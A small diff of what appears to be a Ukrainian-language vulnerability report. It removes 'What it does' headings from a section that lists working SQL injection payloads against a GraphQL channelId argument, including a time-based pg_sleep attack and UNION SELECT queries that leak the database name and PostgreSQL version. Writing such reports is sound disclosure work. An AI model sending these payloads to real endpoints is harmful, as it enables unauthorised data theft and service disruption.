@@ -245,7 +245,6 @@ Kubernetes ServiceAccount token
 {"query":"{ toEthereumElapse(lastest: 1, channelId:\"test'abc\") { elapse } }"}
 ```
 
-> Що робить:
 > Провокує SQL syntax error шляхом інʼєкції одинарної лапки.
 > Використовується для підтвердження факту SQL Injection та витоку stack trace.
 
@@ -253,7 +252,6 @@ Kubernetes ServiceAccount token
 {"query":"{ toEthereumElapse(lastest: 1, channelId:\"test123'+'abc\") { __typename } }"}
 ```
 
-> Що робить:
 > Перевіряє SQL expression evaluation та конкатенацію рядків у бекенді.
 
 2. **Time-based payload**
@@ -262,7 +260,6 @@ Kubernetes ServiceAccount token
 {"query":"{ toEthereumElapse(lastest: 1, channelId:\"x'||pg_sleep(5)||'y'--\") { __typename } }"}
 ```
 
-> Що робить:
 > Використовує pg_sleep(5) для time-based SQL Injection,
 > підтверджуючи можливість виконання довільних SQL-функцій та DoS-вплив.
 
@@ -272,7 +269,6 @@ Kubernetes ServiceAccount token
 {"query":"{ toEthereumElapse(lastest: 1, channelId:\"x' UNION SELECT now(), now() + make_interval(secs => ascii(substr((select current_database())::text,1,1)))--\") { elapse } }"}
 ```
 
-> Що робить:
 > Витягує перший символ імені БД, перетворює його в ASCII-код
 > і повертає через числове поле elapse.
 
@@ -280,6 +276,5 @@ Kubernetes ServiceAccount token
 {"query":"{ toEthereumElapse(lastest: 1, channelId:\"x' UNION SELECT now(), now() + make_interval(secs => ascii(substr((select version())::text,1,1)))--\") { elapse } }"}
 ```
 
-> Що робить:
 > Витягує версію PostgreSQL через ASCII-екодування
 > та підтверджує повний arbitrary SELECT capability.
